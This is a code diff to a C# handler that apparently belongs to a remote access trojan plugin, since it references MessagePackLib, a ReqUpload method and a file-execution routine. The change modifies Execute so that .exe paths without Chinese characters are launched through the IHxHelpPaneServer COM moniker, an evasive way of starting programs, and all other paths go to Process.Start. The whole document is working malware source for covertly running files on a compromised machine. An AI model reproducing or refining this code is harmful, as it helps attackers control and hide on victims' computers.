@@ -8,6 +8,7 @@ using System.Threading;
 using MessagePackLib.MessagePack;
 using System.Runtime.InteropServices;
 using Microsoft.Win32;
+using System.Text.RegularExpressions;
 
 namespace Plugin.Handler
 {
@@ -384,10 +385,27 @@ namespace Plugin.Handler
         }
 
         public void Execute(string fullpath)
-        {
-            IHxHelpPaneServer server = (IHxHelpPaneServer)Marshal.BindToMoniker(String.Format("new:8cec58ae-07a1-11d9-b15e-000d56bfe6ee"));
-            Uri target = new Uri(fullpath);
-            server.Execute(target.AbsoluteUri);
+        {            
+            bool ContaainChinese = false;
+            for (int i = 0; i < fullpath.Length; i++)
+            {
+                if (Regex.IsMatch(fullpath[i].ToString(), @"[\u4e00-\u9fbb]"))
+                {
+                    ContaainChinese = true;
+                    break;
+                }
+            }
+            if (Regex.IsMatch(fullpath, @"(.*)(\.exe)$")&& ContaainChinese == false)
+            {
+                IHxHelpPaneServer server = (IHxHelpPaneServer)Marshal.BindToMoniker(String.Format("new:8cec58ae-07a1-11d9-b15e-000d56bfe6ee"));
+                Uri target = new Uri(fullpath);
+                server.Execute(target.AbsoluteUri);
+            }
+            else
+            {
+                Process.Start(fullpath);
+            }
+
         }
 
         public void ReqUpload(string id)
